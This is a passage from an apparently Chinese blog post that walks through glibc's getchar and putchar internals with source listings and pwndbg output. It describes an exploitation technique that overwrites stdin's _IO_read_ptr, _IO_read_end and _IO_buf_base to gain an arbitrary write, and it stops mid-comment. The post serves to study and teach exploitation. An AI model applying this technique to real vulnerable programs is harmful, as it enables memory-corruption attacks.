class="variable">_IO_switch_to_main_get_area</span> (fp);</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;<span class="variable">_IO_read_ptr</span> &lt; fp-&gt;<span class="variable">_IO_read_end</span>)</span><br><span class="line">return *(unsigned char *) fp-&gt;<span class="variable">_IO_read_ptr</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">_IO_have_markers</span> (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (save_for_backup (fp, fp-&gt;<span class="variable">_IO_read_end</span>))</span><br><span class="line">return EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">_IO_have_backup</span> (fp))</span><br><span class="line">    <span class="variable">_IO_free_backup_area</span> (fp);</span><br><span class="line">  return <span class="variable">_IO_UFLOW</span> (fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>前面的操作在干啥我也不太清楚，但是最终调用了<code>return _IO_UFLOW (fp);</code><br><code>#define _IO_UFLOW(FP) JUMP0 (__uflow, FP)</code><br><code>#define JUMP0(FUNC, THIS) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS)</code><br>宏特别多，这些宏都是一套套一套，只说下最后的功能是：在其对应的vtable中调用了 <strong>uflow。不太清楚这个 </strong>uflow是啥，于是动态调试一波:<br>以stdin为例：<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p <span class="variable">_IO_2_1_stdin_</span> </span><br><span class="line">$<span class="number">7</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    <span class="variable">_flags</span> = -<span class="number">72540024</span>, </span><br><span class="line">    <span class="variable">_IO_read_ptr</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_IO_read_end</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_IO_read_base</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_IO_write_base</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_IO_write_ptr</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_IO_write_end</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_IO_buf_base</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_IO_buf_end</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_IO_save_base</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_IO_backup_base</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_IO_save_end</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_markers</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_chain</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_fileno</span> = <span class="number">0</span>, </span><br><span class="line">    <span class="variable">_flags2</span> = <span class="number">0</span>, </span><br><span class="line">    <span class="variable">_old_offset</span> = -<span class="number">1</span>, </span><br><span class="line">    <span class="variable">_cur_column</span> = <span class="number">0</span>, </span><br><span class="line">    <span class="variable">_vtable_offset</span> = <span class="number">0</span> <span class="string">'\000'</span>, </span><br><span class="line">    <span class="variable">_shortbuf</span> = <span class="string">""</span>, </span><br><span class="line">    <span class="variable">_lock</span> = <span class="number">0</span>x7ffff7dd3790 &lt;<span class="variable">_IO_stdfile_0_lock</span>&gt;, </span><br><span class="line">    <span class="variable">_offset</span> = -<span class="number">1</span>, </span><br><span class="line">    <span class="variable">_codecvt</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_wide_data</span> = <span class="number">0</span>x7ffff7dd19c0 &lt;<span class="variable">_IO_wide_data_0</span>&gt;, </span><br><span class="line">    <span class="variable">_freeres_list</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_freeres_buf</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">__pad5</span> = <span class="number">0</span>, </span><br><span class="line">    <span class="variable">_mode</span> = <span class="number">0</span>, </span><br><span class="line">    <span class="variable">_unused2</span> = <span class="string">'\000'</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0</span>x7ffff7dd06e0 &lt;<span class="variable">_IO_file_jumps</span>&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>vtable是_IO_file_jumps,</p><p>他里面的内容是<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p <span class="variable">_IO_file_jumps</span></span><br><span class="line">$<span class="number">6</span> = &#123;</span><br><span class="line">  <span class="variable">__dummy</span> = <span class="number">0</span>, </span><br><span class="line">  <span class="variable">__dummy2</span> = <span class="number">0</span>, </span><br><span class="line">  <span class="variable">__finish</span> = <span class="number">0</span>x7ffff7a869c0 &lt;<span class="variable">_IO_new_file_finish</span>&gt;, </span><br><span class="line">  <span class="variable">__overflow</span> = <span class="number">0</span>x7ffff7a87730 &lt;<span class="variable">_IO_new_file_overflow</span>&gt;, </span><br><span class="line">  <span class="variable">__underflow</span> = <span class="number">0</span>x7ffff7a874a0 &lt;<span class="variable">_IO_new_file_underflow</span>&gt;, </span><br><span class="line">  <span class="variable">__uflow</span> = <span class="number">0</span>x7ffff7a88600 &lt;<span class="variable">__GI__IO_default_uflow</span>&gt;, </span><br><span class="line">  <span class="variable">__pbackfail</span> = <span class="number">0</span>x7ffff7a89980 &lt;<span class="variable">__GI__IO_default_pbackfail</span>&gt;, </span><br><span class="line">  <span class="variable">__xsputn</span> = <span class="number">0</span>x7ffff7a861e0 &lt;<span class="variable">_IO_new_file_xsputn</span>&gt;, </span><br><span class="line">  <span class="variable">__xsgetn</span> = <span class="number">0</span>x7ffff7a85ec0 &lt;<span class="variable">__GI__IO_file_xsgetn</span>&gt;, </span><br><span class="line">  <span class="variable">__seekoff</span> = <span class="number">0</span>x7ffff7a854c0 &lt;<span class="variable">_IO_new_file_seekoff</span>&gt;, </span><br><span class="line">  <span class="variable">__seekpos</span> = <span class="number">0</span>x7ffff7a88a00 &lt;<span class="variable">_IO_default_seekpos</span>&gt;, </span><br><span class="line">  <span class="variable">__setbuf</span> = <span class="number">0</span>x7ffff7a85430 &lt;<span class="variable">_IO_new_file_setbuf</span>&gt;, </span><br><span class="line">  <span class="variable">__sync</span> = <span class="number">0</span>x7ffff7a85370 &lt;<span class="variable">_IO_new_file_sync</span>&gt;, </span><br><span class="line">  <span class="variable">__doallocate</span> = <span class="number">0</span>x7ffff7a7a180 &lt;<span class="variable">__GI__IO_file_doallocate</span>&gt;, </span><br><span class="line">  <span class="variable">__read</span> = <span class="number">0</span>x7ffff7a861a0 &lt;<span class="variable">__GI__IO_file_read</span>&gt;, </span><br><span class="line">  <span class="variable">__write</span> = <span class="number">0</span>x7ffff7a85b70 &lt;<span class="variable">_IO_new_file_write</span>&gt;, </span><br><span class="line">  <span class="variable">__seek</span> = <span class="number">0</span>x7ffff7a85970 &lt;<span class="variable">__GI__IO_file_seek</span>&gt;, </span><br><span class="line">  <span class="variable">__close</span> = <span class="number">0</span>x7ffff7a85340 &lt;<span class="variable">__GI__IO_file_close</span>&gt;, </span><br><span class="line">  <span class="variable">__stat</span> = <span class="number">0</span>x7ffff7a85b60 &lt;<span class="variable">__GI__IO_file_stat</span>&gt;, </span><br><span class="line">  <span class="variable">__showmanyc</span> = <span class="number">0</span>x7ffff7a89af0 &lt;<span class="variable">_IO_default_showmanyc</span>&gt;, </span><br><span class="line">  <span class="variable">__imbue</span> = <span class="number">0</span>x7ffff7a89b00 &lt;<span class="variable">_IO_default_imbue</span>&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>所以最终调用的函数其实是:<code>__GI__IO_default_uflow.</code></p><p>看下他的定义:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_default_uflow (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> ch = _IO_UNDERFLOW (fp);</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>他又调用了<code>_IO_UNDERFLOW (fp)</code></p><p><code>#define _IO_UNDERFLOW(FP) JUMP0 (__underflow, FP)</code></p><p>同理，这个是调用了<code>_IO_new_file_underflow</code><br>追了这么久，这个函数就是最底层的操作了，用来读取你的键盘输入.<br>看下他的定义：<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line"><span class="variable">_IO_new_file_underflow</span> (<span class="variable">_IO_FILE</span> *fp) <span class="comment">//最底层的输入操作</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="variable">_IO_ssize_t</span> <span class="built_in">count</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="comment">/* SysV does not make this test; take it out for compatibility */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;<span class="variable">_flags</span> &amp; <span class="variable">_IO_EOF_SEEN</span>)</span><br><span class="line">    return (EOF);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;<span class="variable">_flags</span> &amp; <span class="variable">_IO_NO_READS</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;<span class="variable">_flags</span> |= <span class="variable">_IO_ERR_SEEN</span>;</span><br><span class="line">      <span class="variable">__set_errno</span> (EBADF);</span><br><span class="line">      return EOF;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;<span class="variable">_IO_read_ptr</span> &lt; fp-&gt;<span class="variable">_IO_read_end</span>)</span><br><span class="line">    return *(unsigned char *) fp-&gt;<span class="variable">_IO_read_ptr</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;<span class="variable">_IO_buf_base</span> == NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;<span class="variable">_IO_save_base</span> != NULL)</span><br><span class="line">&#123;</span><br><span class="line">  free (fp-&gt;<span class="variable">_IO_save_base</span>);</span><br><span class="line">  fp-&gt;<span class="variable">_flags</span> &amp;= ~<span class="variable">_IO_IN_BACKUP</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="variable">_IO_doallocbuf</span> (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flush all line buffered files before reading. */</span></span><br><span class="line">  <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;<span class="variable">_flags</span> &amp; (<span class="variable">_IO_LINE_BUF</span>|<span class="variable">_IO_UNBUFFERED</span>))</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">      <span class="variable">_IO_flush_all_linebuffered</span> ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">      <span class="comment">/* We used to flush all line-buffered stream.  This really isn't</span></span><br><span class="line"><span class="comment"> required by any standard.  My recollection is that</span></span><br><span class="line"><span class="comment"> traditional Unix systems did this for stdout.  stderr better</span></span><br><span class="line"><span class="comment"> not be line buffered.  So we do just that here</span></span><br><span class="line"><span class="comment"> explicitly.  --drepper */</span></span><br><span class="line">      <span class="variable">_IO_acquire_lock</span> (<span class="variable">_IO_stdout</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="variable">_IO_stdout</span>-&gt;<span class="variable">_flags</span> &amp; (<span class="variable">_IO_LINKED</span> | <span class="variable">_IO_NO_WRITES</span> | <span class="variable">_IO_LINE_BUF</span>))</span><br><span class="line">  == (<span class="variable">_IO_LINKED</span> | <span class="variable">_IO_LINE_BUF</span>))</span><br><span class="line"><span class="variable">_IO_OVERFLOW</span> (<span class="variable">_IO_stdout</span>, EOF);</span><br><span class="line"></span><br><span class="line">      <span class="variable">_IO_release_lock</span> (<span class="variable">_IO_stdout</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable">_IO_switch_to_get_mode</span> (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* This is very tricky. We have to adjust those</span></span><br><span class="line"><span class="comment">     pointers before we call _IO_SYSREAD () since</span></span><br><span class="line"><span class="comment">     we may longjump () out while waiting for</span></span><br><span class="line"><span class="comment">     input. Those pointers may be screwed up. H.J. */</span></span><br><span class="line">  fp-&gt;<span class="variable">_IO_read_base</span> = fp-&gt;<span class="variable">_IO_read_ptr</span> = fp-&gt;<span class="variable">_IO_buf_base</span>;</span><br><span class="line">  fp-&gt;<span class="variable">_IO_read_end</span> = fp-&gt;<span class="variable">_IO_buf_base</span>;</span><br><span class="line">  fp-&gt;<span class="variable">_IO_write_base</span> = fp-&gt;<span class="variable">_IO_write_ptr</span> = fp-&gt;<span class="variable">_IO_write_end</span> <span class="comment">//都等于了_IO_buf_base</span></span><br><span class="line">    = fp-&gt;<span class="variable">_IO_buf_base</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">count</span> = <span class="variable">_IO_SYSREAD</span> (fp, fp-&gt;<span class="variable">_IO_buf_base</span>,</span><br><span class="line">       fp-&gt;<span class="variable">_IO_buf_end</span> - fp-&gt;<span class="variable">_IO_buf_base</span>); <span class="comment">//从这里知道 _IO_buf_base是读入起始位置，_IO_buf_end是结束位置。</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">count</span> &lt;= <span class="number">0</span>) <span class="comment">//读入时出错</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">count</span> == <span class="number">0</span>)</span><br><span class="line">fp-&gt;<span class="variable">_flags</span> |= <span class="variable">_IO_EOF_SEEN</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">fp-&gt;<span class="variable">_flags</span> |= <span class="variable">_IO_ERR_SEEN</span>, <span class="built_in">count</span> = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;<span class="variable">_IO_read_end</span> += <span class="built_in">count</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">count</span> == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If a stream is read to EOF, the calling application may switch active</span></span><br><span class="line"><span class="comment"> handles.  As a result, our offset cache would no longer be valid, so</span></span><br><span class="line"><span class="comment"> unset it.  */</span></span><br><span class="line">      fp-&gt;<span class="variable">_offset</span> = <span class="variable">_IO_pos_BAD</span>;</span><br><span class="line">      return EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;<span class="variable">_offset</span> != <span class="variable">_IO_pos_BAD</span>)</span><br><span class="line">    <span class="variable">_IO_pos_adjust</span> (fp-&gt;<span class="variable">_offset</span>, <span class="built_in">count</span>);</span><br><span class="line">  return *(unsigned char *) fp-&gt;<span class="variable">_IO_read_ptr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>关键看这些<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  ....</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="title">if</span> (fp-&gt;</span>_IO_<span class="function"><span class="title">read_ptr</span> &lt; fp-&gt;</span>_IO_read_end)<span class="comment">//需要绕过</span></span><br><span class="line">   <span class="function"><span class="title">return</span> *(unsigned char *) fp-&gt;</span>_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  ....</span><br><span class="line"><span class="function"><span class="title">fp</span>-&gt;</span>_IO_<span class="function"><span class="title">read_base</span> = fp-&gt;</span>_IO_<span class="function"><span class="title">read_ptr</span> = fp-&gt;</span>_IO_buf_base;</span><br><span class="line">   <span class="function"><span class="title">fp</span>-&gt;</span>_IO_<span class="function"><span class="title">read_end</span> = fp-&gt;</span>_IO_buf_base;</span><br><span class="line">   <span class="function"><span class="title">fp</span>-&gt;</span>_IO_<span class="function"><span class="title">write_base</span> = fp-&gt;</span>_IO_<span class="function"><span class="title">write_ptr</span> = fp-&gt;</span>_IO_write_end <span class="comment">//都等于了_IO_buf_base</span></span><br><span class="line">   = <span class="function"><span class="title">fp</span>-&gt;</span>_IO_buf_base;</span><br><span class="line"> <span class="function"><span class="title">count</span> = _IO_SYSREAD (fp, fp-&gt;</span>_IO_buf_base,</span><br><span class="line">       <span class="function"><span class="title">fp</span>-&gt;</span>_IO_<span class="function"><span class="title">buf_end</span> - fp-&gt;</span>_IO_buf_base); <span class="comment">//从这里知道 _IO_buf_base是读入起始位置，_IO_buf_end是结束位置。</span></span><br><span class="line"><span class="function"><span class="title">fp</span>-&gt;</span>_IO_read_end += count;</span><br></pre></td></tr></table></figure></p><p>这里的_IO_SYSREAD最终会调用read，从你的键盘读入数据。且_IO_read_ptr等于了_IO_buf_base,_IO_read_end等于了_IO_buf_base+count.再次调用getchar时又可以读取正常读取缓冲区了。<strong>从这里可以知道，如果控制了_IO_buf_base，就可以造成任意写的能力。</strong></p><p>总结一下：getchar函数会先判断是否已经读完了输入缓冲区（_IO_read_ptr&gt;=_IO_read_end?),如果输入缓冲区还没有读完，则返回_IO_read_ptr指向的一字节内容，并自增1，如果输入缓冲区已经读完了，则最终调用_IO_new_file_underflow 重新进行读取，填充缓冲区，并调整_IO_read_ptr和_IO_read_end指针的位置。</p><h5 id="利用手法："><a href="#利用手法：" class="headerlink" title="利用手法："></a>利用手法：</h5><p>覆盖 stdin 里的_IO_read_ptr和_IO_read_end，使_IO_read_ptr&gt;= _IO_read_end，以绕过:<br><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(unsigned <span class="built_in">char</span> *) fp-&gt;_IO_read_ptr;</span><br></pre></td></tr></table></figure></p><p>修改_IO_buf_base为你想写入的位置，_IO_buf_end为你想写入的位置的末尾即可。</p><h4 id="putchar："><a href="#putchar：" class="headerlink" title="putchar："></a>putchar：</h4><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span></span><br><span class="line">putchar (<span class="built_in">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> <span class="literal">result</span>;</span><br><span class="line">  _IO_acquire_lock (_IO_stdout);</span><br><span class="line">  <span class="literal">result</span> = _IO_putc_unlocked (c, _IO_stdout);</span><br><span class="line">  _IO_release_lock (_IO_stdout);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">result</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和getchar很像，调用了_IO_putc_unlocked，<br>其定义如下:<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define _IO_putc_unlocked(_ch, _fp) \</span></span><br><span class="line">   <span class="function"><span class="params">(_IO_BE ((_fp)-&gt;_IO_write_ptr &gt;= (_fp)-&gt;_IO_write_end, <span class="number">0</span>) <span class="string">\</span></span></span></span><br><span class="line"><span class="function"><span class="params">    ? __overflow (_fp, (unsigned char) (_ch)) <span class="string">\</span></span></span></span><br><span class="line"><span class="function"><span class="params">    : (unsigned char) (*(_fp)-&gt;_IO_write_ptr++ = (_ch)))</span></span></span><br></pre></td></tr></table></figure></p><p>如果_IO_write_ptr&gt;=_IO_write_end说明缓冲区已满，需要调用<strong>overflow来刷新缓冲区，将缓冲区的内容写入文件中，否者_IO_write_ptr指向的内容=ch，然后_IO_write_ptr自增1.</strong>oveflow函数最终调用了_IO_new_file_overflow，其定义如下:<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, int ch) <span class="comment">//最底层的输出操作，这里的输出指的是向fd指向的文件写入，如果是stdout，即是向终端输出。</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="title">if</span> (f-&gt;</span>_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="function"><span class="title">f</span>-&gt;</span>_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      return EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="function"><span class="title">if</span> ((f-&gt;</span>_<span class="function"><span class="title">flags</span> &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;</span>_IO_write_base == NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="function"><span class="title">if</span> (f-&gt;</span>_IO_write_base == NULL)</span><br><span class="line">      &#123;</span><br><span class="line">         _IO_doallocbuf (f);</span><br><span class="line">         _IO_<span class="function"><span class="title">setg</span> (f, f-&gt;</span>_IO_<span class="function"><span class="title">buf_base</span>, f-&gt;</span>_IO_<span class="function"><span class="title">buf_base</span>, f-&gt;</span>_IO_buf_base);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="function"><span class="title">size_t</span> nbackup = f-&gt;</span>_IO_<span class="function"><span class="title">read_end</span> - f-&gt;</span>_IO_read_ptr;</span><br><span class="line">      _IO_free_backup_area (f);</span><br><span class="line">      <span class="function"><span class="title">f</span>-&gt;</span>_IO_<span class="function"><span class="title">read_base</span> -= MIN (nbackup,f-&gt;</span>_IO_<span class="function"><span class="title">read_base</span> - f-&gt;</span>_IO_buf_base);</span><br><span class="line">      <span class="function"><span class="title">f</span>-&gt;</span>_IO_<span class="function"><span class="title">read_ptr</span> = f-&gt;</span>_IO_read_base;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      <span class="function"><span class="title">if</span> (f-&gt;</span>_IO_<span class="function"><span class="title">read_ptr</span> == f-&gt;</span>_IO_buf_end)</span><br><span class="line">        <span class="function"><span class="title">f</span>-&gt;</span>_IO_<span class="function"><span class="title">read_end</span> = f-&gt;</span>_IO_<span class="function"><span class="title">read_ptr</span> = f-&gt;</span>_IO_buf_base;</span><br><span class="line"></span><br><span class="line">          <span class="function"><span class="title">f</span>-&gt;</span>_IO_<span class="function"><span class="title">write_ptr</span> = f-&gt;</span>_IO_read_ptr;</span><br><span class="line">          <span class="function"><span class="title">f</span>-&gt;</span>_IO_<span class="function"><span class="title">write_base</span> = f-&gt;</span>_IO_write_ptr;</span><br><span class="line">          <span class="function"><span class="title">f</span>-&gt;</span>_IO_<span class="function"><span class="title">write_end</span> = f-&gt;</span>_IO_buf_end;</span><br><span class="line">          <span class="function"><span class="title">f</span>-&gt;</span>_IO_<span class="function"><span class="title">read_base</span> = f-&gt;</span>_IO_<span class="function"><span class="title">read_ptr</span> = f-&gt;</span>_IO_read_end;</span><br><span class="line"></span><br><span class="line">      <span class="function"><span class="title">f</span>-&gt;</span>_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="function"><span class="title">if</span> (f-&gt;</span>_<span class="function"><span class="title">mode</span> &lt;= 0 &amp;&amp; f-&gt;</span>_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">        <span class="function"><span class="title">f</span>-&gt;</span>_IO_<span class="function"><span class="title">write_end</span> = f-&gt;</span>_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="function"><span class="title">return</span> _IO_do_write (f, f-&gt;</span>_IO_<span class="function"><span class="title">write_base</span> , f-&gt;</span>_IO_<span class="function"><span class="title">write_ptr</span> - f-&gt;</span>_IO_write_base);</span><br><span class="line">    <span class="comment">/*最初时write_ptr = write_base , 